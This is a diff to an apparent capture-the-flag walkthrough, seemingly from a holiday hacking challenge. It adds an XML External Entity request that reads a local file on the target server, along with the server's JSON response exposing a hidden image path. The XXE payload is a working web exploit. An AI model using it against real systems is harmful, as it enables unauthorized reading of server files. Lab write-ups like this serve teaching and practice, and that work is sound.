@@ -335,3 +335,22 @@ Accept-Encoding: gzip, deflate
   "visit": "none"
 }
 ```
+- Ok, so let's try putting the payload in the *<reqType>* and replace *<imgDrop>* with *img1*.
+- Request:
+```xml
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt"> ]>
+<root>
+  <imgDrop>img1</imgDrop>
+  <who>princess</who>
+  <reqType>&xxe;</reqType>
+</root>
+```
+- Response:
+```json
+{
+  "appResp": "No, really I couldn't. Really? I can have the beautiful silver ring? I shouldn't, but if you insist, I accept! In return, behold, one of Kringle's golden rings! Grinchum dropped this one nearby. Makes one wonder how 'precious' it really was to him. Though I haven't touched it myself, I've been keeping it safe until someone trustworthy such as yourself came along. Congratulations!^Wow, I have never seen that before! She must really trust you!",
+  "droppedOn": "none",
+  "visit": "static/images/x_phial_pholder_2022/goldring-morethansupertopsecret76394734.png,200px,290px"
+}
+```
